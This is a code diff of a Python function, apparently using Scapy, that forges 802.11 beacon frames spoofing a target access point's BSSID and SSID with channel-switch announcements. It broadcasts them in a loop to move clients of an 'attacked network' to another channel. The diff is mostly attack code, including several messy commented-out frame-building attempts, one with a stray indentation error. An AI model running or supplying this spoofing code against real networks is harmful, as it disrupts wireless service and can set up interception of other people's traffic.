@@ -102,27 +102,67 @@ def spoof_beacon(ap, interface):
             new_channel = 5
         case _:
             print(f'Not handled channel {ap.channel}')
+            exit()
 
     # Change channel to go on the same as attacked network
     print(f'{interface} channel changed to {ap.channel} to send forged beacon')
     change_channel(interface, ap.channel)
 
-    # Forge an beacon frame to inform clients on the network the channel change is occuring
+    # Forge an beacon frame to inform clients of the network the channel change is occuring
+    """
     dot11 = Dot11(type=0, subtype=8, addr1='FF:FF:FF:FF:FF:FF', addr2 = ap.bssid, addr3 = ap.bssid)
-    beacon = Dot11Beacon()
+    beacon = Dot11Beacon(cap='ESS+privacy')
     essid = Dot11Elt(ID='SSID', info=ap.ssid, len=len(ap.ssid))
     new_essid = Dot11Elt(ID="DSset", info=chr(new_channel))
+    csa = Dot11Elt(ID=21, info=chr(0x04) + chr(new_channel) + chr(0x00))
     rsn = Dot11Elt(ID='RSNinfo', info=ap.rsn)
-    frame = RadioTap()/dot11/beacon/essid/new_essid/rsn
+ 
 
+    dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap.bssid, addr3=ap.bssid)
+    beacon = Dot11Beacon(cap="ESS")
+    essid = Dot11Elt(ID="SSID", info=ap.ssid)
+    dsset = Dot11Elt(ID="DSset", info=chr(new_channel))
+    csa = Dot11Elt(ID="Channel Switch", info='\x00' + chr(new_channel) + '\x00')
+    
+
+    dot11 = Dot11(type=0, subtype=8, addr1="FF:FF:FF:FF:FF:FF", addr2=ap.bssid, addr3=ap.bssid)
+    beacon = Dot11Beacon(cap='ESS+privacy')
+    essid = Dot11Elt(ID='SSID',info=ap.ssid, len=len(ap.ssid))
+    csa_info = '\x00' + chr(new_channel) + '\x00'
+    print(f'CSA INFO: {csa_info}')
+    #csa = Dot11Elt(ID="Channel Switch Announcement", info=(csa_info))
+    
+    csa = Dot11Elt(ID='Channel Switch', info="".join((
+        '\x00',      #Channel switch mode
+        hex(ord(hex(new_channel)[2:])),    #new channel ))
+        '\x00')))    #channel switch cnt  
+    csa = Raw("\x00\x04\x25\x03\x00" + chr(new_channel) + "\x00")
+ 
+    frame = RadioTap()/dot11/beacon/essid/csa
+
+     frame = RadioTap()/dot11/beacon/essid/new_essid/rsn
+    frame = RadioTap() / Dot11(type=0, subtype=8, addr1='FF:FF:FF:FF:FF:FF', addr2 = ap.bssid, addr3 = ap.bssid) / Dot11Elt(ID="DSset", info=chr(new_channel)) / Dot11Elt(ID=21, info=chr(0x04) + chr(new_channel) + chr(0x00))
+    frame = beacon = RadioTap() / dot11 / beacon / essid / rates / dsset / csa
     frame.show()
     print("\nHexDump of frame:")
     hexdump(frame)
     input("\nPress enter to start\n")
+    """
 
     # Send the forged beacon
-    sendp(frame, iface=interface, inter=0.500, loop=1)
+    #sendp(frame, iface=interface, inter=0.100, loop=1)
 
+    # Create the 802.11 beacon frame
+    beacon = Dot11Beacon(cap="ESS")
+    essid = Dot11Elt(ID="SSID", info=ap.ssid, len=len(ap.ssid))
+    dsset = Dot11Elt(ID="DSset", info=chr(ap.channel))
+    beacon_frame = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=ap.bssid, addr3="ff:ff:ff:ff:ff:ff") / beacon / essid / dsset
+
+    # Create the 802.11 channel switch announcement
+    switch_announce = Dot11Elt(ID="DSset", info=chr(new_channel))
+
+    # Send the frames
+    sendp(beacon_frame / switch_announce, iface=interface, inter=0.1, loop=1)
 
 
 def main():
